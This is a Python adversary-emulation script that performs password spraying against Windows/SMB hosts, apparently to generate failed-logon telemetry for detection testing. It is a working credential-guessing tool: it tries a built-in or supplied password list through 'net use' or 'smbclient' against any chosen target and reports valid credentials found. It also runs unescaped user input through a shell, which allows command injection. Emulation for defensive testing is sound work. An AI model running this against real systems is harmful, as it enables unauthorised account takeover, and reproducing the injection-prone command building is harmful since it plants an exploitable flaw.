#!/usr/bin/env python3
"""
Adversary Emulation: RDP / Network Password Spraying & Brute Force
Framework: MITRE ATT&CK T1110.003 (Password Spraying)
Author: Nayan Solanki
Purpose: Simulates authentication brute force attacks to generate Event ID 4625 telemetry.
"""

import argparse
import platform
import subprocess
import time
import os
from engine import BaseAdversaryTechnique

DEFAULT_PASSWORDS = [
    "Password123",
    "Admin2026!",
    "Welcome1!",
    "Summer2026",
    "123456",
    "Spring2026!",
    "Company2026",
    "Winter2025!"
]


class BruteForceSimulator(BaseAdversaryTechnique):
    def __init__(self, username="Administrator", delay=2.0, wordlist=None):
        super().__init__(
            technique_id="T1110.003",
            technique_name="Password Spraying",
            tactic="Credential Access"
        )
        self.username = username
        self.delay = delay
        self.wordlist = wordlist
        self.passwords = DEFAULT_PASSWORDS

        if self.wordlist and os.path.exists(self.wordlist):
            try:
                with open(self.wordlist, "r", encoding="utf-8", errors="ignore") as f:
                    self.passwords = [line.strip() for line in f if line.strip()]
            except Exception as e:
                self.logger.error(f"Failed to load wordlist: {e}")

    def _simulate_windows_auth(self, target_ip: str, username: str, password: str) -> bool:
        os_type = platform.system().lower()
        if os_type == "windows":
            cmd = f"net use \\\\{target_ip} /user:{username} {password} 2>&1"
        else:
            cmd = f"smbclient -L //{target_ip} -U '{username}%{password}' -t 2"

        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
            return result.returncode == 0
        except subprocess.TimeoutExpired:
            self.logger.warning(f"Connection timeout attempting auth to {target_ip}")
            return False
        except Exception as e:
            self.logger.error(f"Execution error: {e}")
            return False

    def execute(self, target_ip=None, dry_run=False):
        if not target_ip:
            target_ip = "192.168.56.10"

        self.logger.info(f"Target Host : {target_ip}")
        self.logger.info(f"Target User : {self.username}")
        self.logger.info(f"Payload Pool: {len(self.passwords)} credentials")
        
        attempts = 0
        success_cred = None
        for pwd in self.passwords:
            attempts += 1
            self.logger.info(f"[{attempts}/{len(self.passwords)}] Probing user '{self.username}' with '{pwd}'")
            
            if dry_run:
                self.logger.info("    [DRY RUN] Skipping actual auth attempt.")
                continue

            success = self._simulate_windows_auth(target_ip, self.username, pwd)
            if success:
                self.logger.warning(f"[+] SUCCESS! Valid credential discovered: {self.username}:{pwd}")
                success_cred = f"{self.username}:{pwd}"
                break
            else:
                self.logger.info("[-] Authentication failed as anticipated (Generating Event 4625).")
            
            time.sleep(self.delay)

        return {
            "target": target_ip,
            "attempts": attempts,
            "success": success_cred is not None,
            "credential": success_cred
        }

    def cleanup(self):
        return True


def main():
    parser = argparse.ArgumentParser(description="Simulate Password Spraying")
    parser.add_argument("--target", "-t", default="192.168.56.10")
    parser.add_argument("--user", "-u", default="Administrator")
    parser.add_argument("--delay", "-d", type=float, default=2.0)
    parser.add_argument("--wordlist", "-w")
    parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()

    simulator = BruteForceSimulator(username=args.user, delay=args.delay, wordlist=args.wordlist)
    simulator.execute(target_ip=args.target, dry_run=args.dry_run)


if __name__ == "__main__":
    main()
